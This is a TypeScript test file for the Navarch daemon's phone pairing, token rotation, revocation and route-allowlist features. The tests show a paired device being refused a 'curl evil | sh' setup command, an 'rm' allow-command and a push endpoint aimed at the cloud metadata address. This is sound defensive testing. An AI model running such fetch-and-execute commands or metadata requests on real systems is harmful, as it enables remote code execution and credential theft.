import { execFileSync } from "node:child_process";
import { mkdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { ApprovalView, DevicePairing, DeviceSession, DeviceView, NavarchEvent, RemoteStatus, RunView } from "@navarch/contracts";
import { afterEach, describe, expect, it } from "vitest";
import { fakeClaude } from "../../../packages/adapters/claude-code/test/fake.ts";
import { makeRepo, tempHome } from "../../../packages/runner/test/helpers.ts";
import { Config } from "../src/config.ts";
import { Daemon } from "../src/daemon.ts";
import { ACCESS_TTL_MS, DeviceService } from "../src/devices/devices.ts";
import { EventStore } from "../src/events/store.ts";
import { proxiesTo } from "../src/remote/tailscale.ts";

const REMOTE = "https://pc.tail1234.ts.net";
const gitEnv = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@e", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@e" };
const daemons: Daemon[] = [];
afterEach(async () => {
  for (const d of daemons.splice(0)) await d.stop().catch(() => {});
});

async function start(extra: Record<string, unknown> = {}) {
  const home = tempHome();
  const fake = fakeClaude("flow");
  // A Tailscale CLI that does not exist: tests never read the operator's tailnet.
  const config = Config.parse({ daemon: { port: 0, remote: { url: REMOTE, tailscale_command: "/nonexistent/tailscale" } }, routing: { enabled: false }, ...extra });
  const daemon = new Daemon({ home, config, adapters: { "claude-code": fake.options } });
  await daemon.start();
  daemons.push(daemon);
  const local = readFileSync(join(home, "token"), "utf8").trim();
  const call = async <T>(token: string | undefined, method: string, path: string, body?: unknown): Promise<{ status: number; body: T }> => {
    const res = await fetch(daemon.url + path, {
      method,
      headers: { ...(token ? { authorization: `Bearer ${token}` } : {}), ...(body ? { "content-type": "application/json" } : {}) },
      ...(body ? { body: JSON.stringify(body) } : {}),
    });
    const text = await res.text();
    return { status: res.status, body: (res.headers.get("content-type")?.includes("json") ? JSON.parse(text) : text) as T };
  };
  const pair = async (name = "Pixel 9") => {
    const pairing = (await call<DevicePairing>(local, "POST", "/api/v1/devices/pairings")).body;
    return (await call<DeviceSession>(undefined, "POST", "/api/v1/devices/pair", { code: pairing.code, name })).body;
  };
  return { daemon, home, local, call, pair };
}

describe("device pairing and sessions (ADR 0020)", () => {
  it("pairs a phone with a single-use code shown as a tailnet URL", async () => {
    const { call, local, daemon } = await start();
    const pairing = await call<DevicePairing>(local, "POST", "/api/v1/devices/pairings");
    expect(pairing.status).toBe(201);
    expect(pairing.body.url).toBe(`${REMOTE}/#pair=${pairing.body.code}`);

    const paired = await call<DeviceSession>(undefined, "POST", "/api/v1/devices/pair", { code: pairing.body.code, name: "Pixel 9" });
    expect(paired.status).toBe(201);
    expect(paired.body.device).toMatchObject({ name: "Pixel 9", revoked_at: null, push: false });
    expect(paired.body.access_token).toMatch(/^nvd_/);
    expect(paired.body.refresh_token).toMatch(/^nvr_/);

    // Single use.
    expect((await call(undefined, "POST", "/api/v1/devices/pair", { code: pairing.body.code, name: "again" })).status).toBe(401);
    // Tokens never reach the event log.
    const log = JSON.stringify(daemon.store.events());
    expect(log).not.toContain(paired.body.access_token);
    expect(log).not.toContain(paired.body.refresh_token);
    expect(log).toContain('"device.paired"');
    expect(statSync(join(daemon.home, "device-key")).mode & 0o777).toBe(0o600);
  });

  it("refuses pairing when remote access is off and pairing from a device", async () => {
    const off = await start({ daemon: { port: 0, remote: { mode: "off" } } });
    expect((await off.call(off.local, "POST", "/api/v1/devices/pairings")).status).toBe(409);

    const { call, pair } = await start();
    const session = await pair();
    expect((await call(session.access_token, "POST", "/api/v1/devices/pairings")).status).toBe(403);
  });

  it("gives a device only the routes of its allowlist and records it as the actor", async () => {
    const { call, pair, local, daemon } = await start();
    const session = await pair();
    const t = session.access_token;
    expect((await call(t, "GET", "/api/v1/runs")).status).toBe(200);
    expect((await call<DeviceView>(t, "GET", "/api/v1/devices/me")).body.id).toBe(session.device.id);
    for (const [method, path] of [
      ["GET", "/api/v1/secrets/github%2Ftoken"],
      ["POST", "/api/v1/web/codes"],
      ["GET", "/api/v1/devices"],
      ["POST", "/api/v1/concierge/conversations"],
      ["GET", "/api/v1/remote"],
    ] as const) {
      expect((await call(t, method, path, method === "POST" ? {} : undefined)).status, `${method} ${path}`).toBe(403);
    }

    // Runs: only a prompt in a known repository, nothing that widens what agents may do.
    const repo = makeRepo();
    expect((await call(t, "POST", "/api/v1/runs", { repo_path: repo, prompt: "x" })).status).toBe(403);
    const first = (await call<RunView>(local, "POST", "/api/v1/runs", { repo_path: repo, prompt: "first" })).body;
    expect((await call(t, "POST", "/api/v1/runs", { repo_path: repo, prompt: "x", setup_commands: ["curl evil | sh"] })).status).toBe(403);
    expect((await call(t, "POST", "/api/v1/runs", { repo_path: repo, prompt: "x", allow_commands: ["rm"] })).status).toBe(403);
    const mine = await call<RunView>(t, "POST", "/api/v1/runs", { repo_path: repo, prompt: "from the phone" });
    expect(mine.status).toBe(201);

    const paused = await call<RunView>(t, "POST", `/api/v1/runs/${first.id}/pause`);
    expect(paused.body.status).toBe("paused");
    const pause = daemon.store
      .events({ runId: first.id })
      .find((e) => e.type === "run.status_changed" && (e as NavarchEvent<"run.status_changed">).payload.to === "paused")!;
    expect(pause.actor).toEqual({ kind: "user", via: "mobile", device_id: session.device.id });
  });

  it("rotates refresh tokens and revokes a device whose old refresh token is reused", async () => {
    let now = Date.UTC(2026, 9, 15, 12);
    const store = new EventStore(join(tempHome(), "navarch.db"));
    const devices = new DeviceService(store, join(tempHome(), "device-key"), () => now);
    const first = devices.pair(devices.createPairing(REMOTE).code, "Pixel");
    expect(devices.authenticate(first.access_token)).toBe(first.device.id);

    const second = devices.refresh(first.refresh_token);
    expect(second.refresh_token).not.toBe(first.refresh_token);
    // Within the grace window a second tab's late refresh is refused without revoking.
    expect(() => devices.refresh(first.refresh_token)).toThrow(/not valid/);
    expect(devices.get(first.device.id)!.revoked_at).toBeNull();

    // Later, the same reuse means the token was copied: the device is revoked.
    now += 5 * 60_000;
    expect(() => devices.refresh(first.refresh_token)).toThrow(/not valid/);
    expect(devices.get(first.device.id)!.revoked_at).not.toBeNull();
    expect(devices.authenticate(second.access_token)).toBeUndefined();
    expect(() => devices.refresh(second.refresh_token)).toThrow();
    store.close();
  });

  it("rejects expired and tampered access tokens", () => {
    let now = Date.UTC(2026, 9, 15, 12);
    const store = new EventStore(join(tempHome(), "navarch.db"));
    const devices = new DeviceService(store, join(tempHome(), "device-key"), () => now);
    const s = devices.pair(devices.createPairing(REMOTE).code, "Pixel");
    const [body, sig] = s.access_token.slice(4).split(".");
    const forged = Buffer.from(JSON.stringify({ d: s.device.id, e: now + 86_400_000 })).toString("base64url");
    expect(devices.authenticate(`nvd_${forged}.${sig}`)).toBeUndefined();
    expect(devices.authenticate(`nvd_${body}.${sig}x`)).toBeUndefined();
    expect(devices.authenticate("not a token")).toBeUndefined();
    now += ACCESS_TTL_MS + 1;
    expect(devices.authenticate(s.access_token)).toBeUndefined();
    store.close();
  });

  it("signs a device out, revokes it from the desktop, and closes its stream", async () => {
    const { call, pair, local, daemon } = await start();
    const a = await pair("Phone A");
    const b = await pair("Phone B");
    // A device can revoke only itself.
    expect((await call(a.access_token, "DELETE", `/api/v1/devices/${b.device.id}`)).status).toBe(403);

    const ws = new WebSocket(`${daemon.url.replace("http", "ws")}/api/v1/stream?token=${encodeURIComponent(b.access_token)}`);
    await new Promise((r, j) => {
      ws.addEventListener("open", r, { once: true });
      ws.addEventListener("error", j, { once: true });
    });
    const closed = new Promise<number>((r) => ws.addEventListener("close", (e) => r(e.code), { once: true }));
    expect((await call<DeviceView>(local, "DELETE", `/api/v1/devices/${b.device.id}`)).body.revoked_at).not.toBeNull();
    expect(await closed).toBe(4401);
    expect((await call(b.access_token, "GET", "/api/v1/runs")).status).toBe(401);

    expect((await call(a.access_token, "DELETE", `/api/v1/devices/${a.device.id}`)).status).toBe(200);
    expect((await call(a.access_token, "GET", "/api/v1/runs")).status).toBe(401);
    const devices = (await call<DeviceView[]>(local, "GET", "/api/v1/devices")).body;
    expect(devices.map((d) => [d.name, d.revoked_at !== null])).toEqual([
      ["Phone B", true],
      ["Phone A", true],
    ]);
  });

  it("accepts push subscriptions only for allowlisted push services", async () => {
    const { call, pair, daemon } = await start();
    const s = await pair();
    const keys = { p256dh: "BCVxsr7N_eNgVRqvHtD0zTZsEc6-VV-JvLexhqUzORcxaOzi6-AYWXvTBHm4bjyPjs7Vd8pZGH6SRpkNtoIAiw4", auth: "BTBZMqHH6r4Tts7J_aSIgg" };
    expect((await call(s.access_token, "PUT", "/api/v1/push/subscription", { endpoint: "https://169.254.169.254/latest", keys })).status).toBe(400);
    expect((await call(s.access_token, "PUT", "/api/v1/push/subscription", { endpoint: "http://fcm.googleapis.com/x", keys })).status).toBe(400);
    expect((await call(s.access_token, "PUT", "/api/v1/push/subscription", { endpoint: "https://web.push.apple.com/abc", keys, locale: "pt-BR" })).status).toBe(204);
    expect(daemon.devices.get(s.device.id)!.push).toBe(true);
    expect(daemon.devices.subscriptions()).toEqual([{ device_id: s.device.id, endpoint: "https://web.push.apple.com/abc", keys, locale: "pt-BR" }]);
    expect(JSON.stringify(daemon.store.events())).not.toContain(keys.auth);
    expect((await call<{ public_key: string }>(s.access_token, "GET", "/api/v1/push/key")).body.public_key).toMatch(/^B/);

    expect((await call(s.access_token, "DELETE", "/api/v1/push/subscription")).status).toBe(204);
    expect(daemon.devices.get(s.device.id)!.push).toBe(false);
  });

  it("reports remote status from config and tailscale", async () => {
    const { call, local } = await start();
    const status = (await call<RemoteStatus>(local, "GET", "/api/v1/remote")).body;
    // The configured Tailscale CLI does not exist; the configured URL is still used.
    expect(status).toMatchObject({ mode: "tailscale", installed: false, url: REMOTE, serving: false });
    expect(status.setup_command).toMatch(/^tailscale serve --bg \d+$/);
    expect(proxiesTo({ Web: { "pc.ts.net:443": { Handlers: { "/": { Proxy: "http://127.0.0.1:7420" } } } } }, 7420)).toBe(true);
    expect(proxiesTo({ Web: { "pc.ts.net:443": { Handlers: { "/": { Proxy: "http://127.0.0.1:3000" } } } } }, 7420)).toBe(false);
  });

  it("decides an approval from a phone, recorded as the device", async () => {
    const { call, local, pair, daemon } = await start();
    const s = await pair();
    const repo = makeRepo();
    mkdirSync(join(repo, ".navarch"));
    writeFileSync(join(repo, ".navarch", "project.yaml"), "autonomy_level: 1\n");
    execFileSync("git", ["add", "."], { cwd: repo, env: gitEnv });
    execFileSync("git", ["commit", "-q", "-m", "cfg"], { cwd: repo, env: gitEnv });
    await call<RunView>(local, "POST", "/api/v1/runs", { repo_path: repo, prompt: "x" });
    let approval: ApprovalView | undefined;
    for (let i = 0; i < 200 && !approval; i++) {
      approval = (await call<ApprovalView[]>(s.access_token, "GET", "/api/v1/approvals?status=pending")).body[0];
      if (!approval) await new Promise((res) => setTimeout(res, 50));
    }
    expect(approval).toBeDefined();
    expect((await call(s.access_token, "POST", `/api/v1/approvals/${approval!.id}`, { decision: "reject" })).status).toBe(200);
    const decided = daemon.store.events().find((e) => e.type === "approval.decided")!;
    expect(decided.actor).toEqual({ kind: "user", via: "mobile", device_id: s.device.id });
  });
});
